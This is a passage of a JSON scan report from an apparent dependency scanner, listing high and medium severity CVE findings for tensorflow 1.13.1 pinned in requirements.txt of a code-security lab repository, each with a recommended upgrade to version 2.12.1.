            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-21741 (severity: high, fixed in 2.7.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-21741](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21741)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "07115aba548721cca20ac6aff5d0a214bc94d8b6"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-23587",
          "ruleIndex": 287,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-23587 (severity: high, fixed in 2.7.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-23587](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23587)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "7d5781c33be3d1a99dd7caad360ec620fe00d89f"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-23561",
          "ruleIndex": 288,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-23561 (severity: high, fixed in 2.7.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-23561](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23561)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "a312ad2e34d6d4b8b45720b52929b6816dd3904c"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-21728",
          "ruleIndex": 289,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-21728 (severity: high, fixed in 2.7.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-21728](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21728)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "7264e303857cad91794fdce8996e14a7ffe222c6"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-23558",
          "ruleIndex": 290,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-23558 (severity: high, fixed in 2.7.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-23558](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23558)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "389b2db75f62ac0b67b41fe109658747bcd3e8cc"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-21731",
          "ruleIndex": 291,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-21731 (severity: high, fixed in 2.7.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-21731](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21731)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "c7ae22ab8768d2132973874de90149463ab429d0"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "GHSA-wcv5-vrvr-3rx2",
          "ruleIndex": 292,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability GHSA-wcv5-vrvr-3rx2 (severity: medium, fixed in 2.7.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [GHSA-wcv5-vrvr-3rx2](https://github.com/advisories/GHSA-wcv5-vrvr-3rx2)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "9aa70c0088f898911391e22e6fafcd46372449d2"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-23578",
          "ruleIndex": 293,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-23578 (severity: medium, fixed in 2.7.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-23578](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23578)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "907bcc627d614cf2f8edbf4b23a05cd73f99337a"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-23565",
          "ruleIndex": 294,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-23565 (severity: high, fixed in 2.7.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-23565](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23565)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "98bb7c9c527cbecc0cd539405db942fe7cf36ce8"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-21739",
          "ruleIndex": 295,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-21739 (severity: high, fixed in 2.7.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-21739](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21739)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "749f70ce07929acc68b77e070ac992f7d66072e6"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-23577",
          "ruleIndex": 296,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-23577 (severity: high, fixed in 2.7.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-23577](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23577)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "2ea0fd4cbfcd3169631ba8f22a4aea2f143a3e23"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-23566",
          "ruleIndex": 297,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-23566 (severity: high, fixed in 2.7.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-23566](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23566)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "72e1928f17ad2a0fe60457a81b60ad4b6e044c43"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-21734",
          "ruleIndex": 298,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-21734 (severity: high, fixed in 2.7.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-21734](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21734)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "235a6422224ff91ca49cffb8020a319e109b482a"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-23570",
          "ruleIndex": 299,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-23570 (severity: high, fixed in 2.7.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-23570](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23570)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "9b622531b51c333752a02fc17065e90e37d80ed9"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-21730",
          "ruleIndex": 300,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-21730 (severity: high, fixed in 2.7.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-21730](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21730)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "48c4cba50f513c2bf9b04bc6943fc225bc09677e"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-23572",
          "ruleIndex": 301,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-23572 (severity: high, fixed in 2.7.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-23572](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23572)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "e94dcedcffc0b36ca713b093710f98c8986673a4"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-23585",
          "ruleIndex": 302,
          "level": "warning",
          "message": {
